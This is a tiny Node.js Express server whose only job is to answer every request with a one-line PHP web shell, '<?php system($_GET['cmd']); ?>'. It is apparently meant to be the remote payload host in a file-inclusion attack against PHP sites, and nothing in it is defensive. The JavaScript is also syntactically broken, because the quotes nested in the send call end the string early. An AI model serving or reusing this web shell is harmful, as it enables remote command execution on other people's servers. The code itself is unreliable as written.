const express = require('express')
const app = express()
app.all('/', (req, res) => {
    console.log("Just got a request!")
    data="hrllo"
    res.send('<?php system($_GET['cmd']); ?>')
})
app.listen(process.env.PORT || 3000)
